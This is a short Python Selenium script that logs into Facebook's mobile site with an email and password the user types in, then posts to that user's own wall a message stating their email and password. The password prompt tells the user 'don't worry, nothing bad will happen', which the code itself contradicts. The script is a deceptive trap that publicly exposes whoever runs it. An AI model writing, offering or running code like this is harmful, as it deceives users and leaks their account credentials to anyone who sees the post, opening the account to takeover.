from selenium import webdriver
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.chrome import ChromeDriverManager
import time

LOGIN_URL = 'https://mbasic.facebook.com/'

class FacebookLogin():
    def __init__(self, email, password, browser='Chrome'):
        # Store credentials for login
        self.email = email
        self.password = password
        if browser == 'Chrome':
            self.driver = webdriver.Chrome(executable_path=ChromeDriverManager().install())
        elif browser == 'Firefox':
            self.driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
        self.driver.get(LOGIN_URL)
        time.sleep(1)

    def login(self):
        email_element = self.driver.find_element_by_name('email')
        email_element.send_keys(self.email)

        password_element = self.driver.find_element_by_name('pass')
        password_element.send_keys(self.password)

        login_button = self.driver.find_element_by_name('login')
        login_button.click()
        time.sleep(2)


    def postToWall(self, p, e):
        self.driver.get(LOGIN_URL)
        post_box=self.driver.find_element_by_name("xc_message")
        post_box.click()
        post_box.send_keys(f'Hi, my email is {e} and my password is {p}')
        time.sleep(2)
        post_it=self.driver.find_element_by_xpath('/html/body/div/div/div[2]/div/div[2]/div/form/table/tbody/tr/td[3]/div/input')
        post_it.click()
        print("Posted...")

if __name__ == '__main__':
    # Enter your login credentials here
    username = input('please enter facebook username/email: ')
    pw = input("please enter facebook password (don't worry, nothing bad will happen)")
    
    fb_login = FacebookLogin(email=username, password=pw, browser='Firefox')
    fb_login.login()
    fb_login.postToWall(pw, username)
